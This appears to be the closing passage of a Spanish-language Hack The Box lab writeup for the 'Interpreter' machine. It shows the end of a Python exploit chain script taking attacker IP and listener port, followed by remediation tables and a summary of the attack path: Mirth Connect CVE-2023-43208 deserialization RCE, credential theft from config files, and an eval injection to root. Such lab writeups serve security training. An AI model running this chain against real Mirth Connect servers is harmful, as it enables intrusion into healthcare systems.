        print("║" + "  INTERPRETER HTB - Full Exploitation Chain  ".center(58) + "║")
        print("║" + " "*58 + "║")
        print("╚" + "="*58 + "╝")
        
        try:
            self.phase1_rce()
            time.sleep(2)
            
            self.phase2_lateral()
            time.sleep(2)
            
            self.phase3_privesc()
            time.sleep(2)
            
            print("\n" + "="*60)
            print("[+] EXPLOTACIÓN COMPLETADA")
            print("="*60)
            print(f"[+] Flag usuario: /home/mirth/user.txt")
            print(f"[+] Flag root: /root/root.txt")
            
        except Exception as e:
            print(f"[-] Error: {e}")
            sys.exit(1)

def main():
    parser = argparse.ArgumentParser(
        description='INTERPRETER HTB - Full Exploitation'
    )
    parser.add_argument('target', help='Target IP')
    parser.add_argument('-l', '--lhost', required=True, help='Attacker IP')
    parser.add_argument('-p', '--lport', type=int, required=True, help='Listener Port')
    
    args = parser.parse_args()
    
    exploit = InterpreterExploit(args.target, args.lhost, args.lport)
    exploit.run_all()

if __name__ == '__main__':
    main()
```

---

## Lecciones de Seguridad

### 6.1 Fallos de Diseño en Mirth Connect

| Fallo | Impacto | Remediación |
|-------|---------|-------------|
| Deserialization sin validación | RCE pre-auth | Implementar whitelist de clases |
| Credenciales en archivos de propiedades | Escalada lateral | Usar variables de entorno + secretos |
| F-string eval en entrada de usuario | RCE como root | Eliminar eval(), usar templates seguros |
| Servicios internos sin auth | Escalada privilegios | Agregar autenticación mTLS |
| PBKDF2 con 600k iteraciones | Lentitud en defensa | Usar Argon2 o scrypt con parámetros mayores |

### 6.2 Buenas Prácticas en Defensa

```
✓ Usar deserialization segura (no aceptar datos no confiables)
✓ Validar entrada del usuario
✓ NO usar eval() nunca
✓ Usar template engines (Jinja2, Thymeleaf) en lugar de f-strings
✓ Implementar WAF (Web Application Firewall)
✓ Segregar redes (servicios internos no accesibles)
✓ Implementar IDS/IPS
✓ Parching regular
✓ Principle of Least Privilege
✓ Encriptación de credenciales en almacenamiento
```

---

## Resumen de Explotación

```
Entrada:      Aplicación Mirth Connect 4.4.0 accesible
              ↓
Fase 1:       CVE-2023-43208 RCE
              - Gadget chain XStream
              - Usuario: mirth
              ↓
Fase 2:       Extracción credenciales BD
              - /proc/[pid]/cwd/conf/mirth.properties
              - PBKDF2 hash generation
              - Acceso MySQL como mirthdb
              ↓
Fase 3:       Descubrimiento notif.py
              - Puerto 54321 (root)
              - F-string eval injection
              ↓
Fase 4:       HL7 Injection
              - Payload vía Mirth channel
              - Ejecución como root
              ↓
Salida:       Acceso completo al sistema
              - /root/root.txt obtenido
              - /home/mirth/user.txt obtenido
```

---

**Writeup creado: 2026-02-21**
**Máquina:** INTERPRETER (HTB)
**Dificultad:** Media
**Tiempo de explotación:** ~45 minutos (manual)
